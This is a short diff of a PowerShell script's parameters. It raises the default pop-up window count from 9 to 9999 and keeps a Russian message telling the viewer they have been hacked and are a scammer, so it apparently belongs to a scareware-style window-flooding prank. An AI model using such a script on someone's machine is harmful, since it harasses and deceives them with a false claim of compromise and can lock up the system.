@@ -1,6 +1,6 @@
 ﻿param(
     [ValidateRange(1, 9999)]
-    [int]$WindowCount = 9,
+    [int]$WindowCount = 9999,
     [string]$WindowMessage = "Тебя взломали, уже поздно, ты — скамер.",
     [string]$WindowTitle = "Тебя взломали, уже поздно, ты — скамер."
 )
